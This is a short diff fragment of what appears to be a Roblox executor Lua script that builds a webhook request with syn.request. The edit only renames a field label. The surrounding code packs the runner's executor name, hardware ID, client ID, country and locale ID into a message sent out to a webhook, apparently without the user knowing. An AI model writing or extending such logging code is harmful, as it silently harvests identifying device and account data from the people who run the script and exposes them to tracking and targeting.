@@ -105,7 +105,7 @@ local requestwebhook = syn.request({
                 ["inline"] = CL
             }, 
             {
-                ["name"] = "INFO EXECUTE",
+                ["name"] = "INFO EXECUTOR",
                 ["value"] = "```Executor Name : "..EXE.."```".."```Hwid : "..a.."```".."```Client ID : "..ClientId.."```".."```Country : "..code.."```".."```Local ID : "..game.Players.LocalPlayer.LocaleId.."```",
                 ["inline"] = CL
             },
